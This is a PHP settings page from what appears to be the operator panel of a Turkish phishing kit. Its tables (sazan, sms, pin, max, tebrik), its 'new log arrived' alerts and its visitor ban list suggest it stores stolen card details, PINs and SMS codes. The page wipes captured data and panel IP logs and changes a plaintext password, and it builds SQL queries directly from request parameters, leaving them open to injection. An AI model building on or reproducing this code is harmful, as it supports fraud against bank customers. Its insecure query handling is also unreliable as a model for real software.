<?php
date_default_timezone_set('Europe/Istanbul');
include("../chante.php");
$sorgula = $db->query("SELECT * FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);
session_start();
$Zaman = date('H:i');
if(!isset($_SESSION["login"])){
  $ip = $_SERVER['REMOTE_ADDR'];
$db->query("DELETE FROM paneldekiler WHERE ip='$ip'");
header('Location:login.php');
}else{
  $ip = $_SERVER['REMOTE_ADDR'];
$db->query("UPDATE paneldekiler SET durum = 'AYARLAR' WHERE ip = '{$ip}'");
if(isset($_GET['tumu'])){
$tumu = $_GET['tumu'];
$db->query("truncate table sazan");
$db->query("truncate table hata");
$db->query("truncate table sms2");
$db->query("truncate table pin");
$db->query("truncate table max");
$db->query("truncate table tebrik");
$db->query("truncate table sms");
echo "<script>alert('Veritabanındaki tüm veriler temizlendi ve sıfırlandı!');</script>";
echo "<script>window.location.href='ayarlar.php';</script>";
}
if(isset($_GET['iptemizle'])){
  $iptemizle = $_GET['iptemizle'];
  $db->query("truncate table paneldekiler");
  echo "<script>alert('Panel IP logu temizlendi!');</script>";
  echo "<script>window.location.href='ayarlar.php';</script>";
  }
if(isset($_GET['bankaldir'])){
$db->query("truncate table ban");
echo "<script>alert('Veritabanındaki tüm banlar kaldırıldı!');</script>";
echo "<script>window.location.href='ayarlar.php';</script>";
}
if(isset($_GET['logout'])){
session_start();
ob_start();
session_unset();
session_destroy();
$ip = $_SERVER['REMOTE_ADDR'];
$db->query("DELETE FROM paneldekiler WHERE ip='$ip'");
header('Location:login.php');
}
if(isset($_GET['sound'])){
  $chante = $_GET['sound'];
  $db->query("UPDATE site SET sound = '$chante' WHERE id = '1'");
  echo "<script>alert('Uyarılar ayarlandı!');</script>";
  echo "<script>window.location.href='ayarlar.php';</script>";
}
if(isset($_GET['refresh'])){
  $refresh = $_GET['refresh'];
  $db->query("UPDATE site SET refresh = '$refresh' WHERE id = '1'");
  echo "<script>window.location.href='ayarlar.php';</script>";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<meta name="description" content="">
<meta name="author" content="">
<title>Admin Panel</title>
<style>

body {
  background-image: url('https://cdn.akamai.steamstatic.com/steam/apps/1332010/ss_e8f0cbd5efdba352e89c4cfcee3fe991a1e1be8a.1920x1080.jpg?t=1660855681');
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: cover;
}
</style>
<!-- Bootstrap Core CSS -->
<link href="./vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

<!-- Custom CSS -->
<link href="./css/adminnine_dark.css" rel="stylesheet">

<!-- Custom Fonts -->
<link href="./vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

<script type="text/javascript" src="https://code.jquery.com/jquery-1.9.1.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.5.1/moment.min.js"></script>

<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
<script type="text/javascript">
      $(window).load(function(){
        $(document).ready(function() {
          var interval = setInterval(function() {
            var momentNow = moment();
            $('#saat').html(momentNow.format('🕒 hh:mm:ss'));
          }, 100);
        });
      });
</script>
<script>
    function chanteCopy() {
  var copyText = document.getElementById("pass");
  copyText.select();
  copyText.setSelectionRange(0, 99999);
  navigator.clipboard.writeText(copyText.value);
  alert("Şifre başarıyla kopyalandı. (CTRL + V)");
}
</script>

<style>
.chante {
  margin-top: 15px;
  text-align: center;
  font-size:2rem;
  color:white;
  font-family: 'Merienda', cursive;
  animation-name:glow;
  animation-duration:1s;
  animation-iteration-count:infinite;
  animation-direction:alternate;
}
@keyframes glow{
  from{text-shadow:0px 0px 5px #fff,0px 0px 5px #614ad3;}
  to{text-shadow:0px 0px 20px #fff,0px 0px 20px #614ad3;}
}

#Box{
  background:#63c77e;
  color:#fff; 
  padding:8px;
  float:center;
  text-align:center;
  left:0;
  font-weight:500;
  margin:0 auto;
  right:0;
  width:300px;
  border:1px solid black;
  position:fixed;
}
</style>
</head>

<body>
<div id="wrapper">
  <div class="navbar-default sidebar" >
    <div class="clearfix"></div>
    <div class="sidebar-nav navbar-collapse">
    <div class="chante">
    <span>deathfung</span>
    </div>
    <hr>
      <!-- user profile pic -->
      <div class="clearfix"></div>
      <!-- user profile pic -->
      <ul class="nav" id="side-menu">
        <li> <a href="index.php"><i class="fa fa-dashboard fa-fw"></i>İstatistik</a> </li>
        <li> <a href="loglar.php"><i class="fa fa-money fa-fw"></i>Loglar</a></li>
        <li> <a href="banlistesi.php"><i class="fa fa-ban fa-fw"></i>Ban Listesi</a></li>
        <li> <a href="ayarlar.php"><i class="fa fa-cog fa-fw"></i>Ayarlar</a></li>
        <li> <a href="?logout"><i class="fa fa-sign-out fa-fw"></i>Çıkış Yap</a></li>
      </ul>
    </div>
    <!-- /.sidebar-collapse --> 
  </div>
  <!-- /.navbar-static-side --> 
  <!-- /.navbar-static-side --> 
  <?php foreach($db->query('SELECT * from site') as $site){
    if($site['sound']=='1'){
        ?>
    <audio id="audioplayer" autoplay=true>
			<source src="css/chante.mp3" type="audio/mpeg">
    </audio>
  <div id="Box">(<?=$Zaman?>) Yeni Log Geldi!</div>
  <?php
   $db->query("UPDATE site SET sound='0'");
  }
} ?>
  <!-- Page Content -->
  <div id="page-wrapper">
    <div class="row">
      <nav class="navbar navbar-default navbar-static-top" style="margin-bottom: 0">
      <ul class="nav navbar-top-links navbar-right">  
        <div id="tarih"></div>
        <div id="saat"></div>
        </ul>
      </nav>
    </div>
    <div class="row">
      <div class="col-md-12  header-wrapper" >
        <h1 class="page-header">⚙️ Ayarlar</h1>
        <p class="page-subtitle">Bu sayfadan panelin genel ayarlarını yapabilirsin.</p>
      </div>
      <!-- /.col-lg-12 --> 
    </div>
    <!-- /.row -->
    <div class="row">
      <div class="col-md-10">
      <span>Bütün Banları Kaldır</span>
      <br>
      <a href="?bankaldir=1"><button type="button" class="btn btn-danger col-md-4 btn-sm">ONAYLA</button></a>
      </div>
      <div class="col-md-10">
      <br>
      <span>Bütün Verileri Temizle</span>
      <br>
      <a href="?tumu=1"><button type="button" class="btn btn-danger col-md-4 btn-sm">ONAYLA</button></a>
      </div>
      <div class="col-md-10">
      <br>
      <span>Panel IP Logu Temizle</span>
      <br>
      <a href="?iptemizle=1"><button type="button" class="btn btn-danger col-md-4 btn-sm">ONAYLA</button></a>  
      </div>
      <div class="col-md-4">
      <br>
      <span>Yenilenme Süresi</span>
      <form>
      <input name="refresh" value="<?= $sorgula['refresh'] ?>" type="text" class="form-control"/><br>
      <a><button class="btn btn-danger col-md-12 btn-sm">ONAYLA</button></a>
      </form>
      </div>
      <div class="col-md-4">
      <br>
      <span>Şifre Değiştir (<a onclick="chanteCopy()" type="submit">Kopyala</a>)</span>
      <form action="?sifre" method="post">
      <input id="pass" name="pass" type="password" value="<?=$sorgula['pass']?>" type="text" class="form-control"/> 
      <br><a><button class="btn btn-danger col-md-12 btn-sm">ONAYLA</button></a>
      </form>
      <?php if(isset($_GET['sifre'])) { ?> 
      <?php if($_POST['pass']) { 
      $pass = $_POST['pass'];
      $db->query("UPDATE site SET pass = '{$pass}' WHERE id = '1'");
      echo "<script>alert('Panel şifresi değiştirildi!');</script>";
      echo "<script>window.location.href='ayarlar.php';</script>";
      }}?>
      </div>  
      <br>
      <br>
      <br>
    </div>
      
    <!-- /.row --> 
  </div>
  <!-- /#page-wrapper --> 
</div>
<!-- /#wrapper -->
<!-- jQuery --> 
<script src="./vendor/jquery/jquery.min.js"></script> 
<!-- Bootstrap Core JavaScript --> 
<script src="./vendor/bootstrap/js/bootstrap.min.js"></script> 
<!-- Custom Theme JavaScript --> 
<script src="./js/adminnine.js"></script>
</body>
</html>
<?php } ?>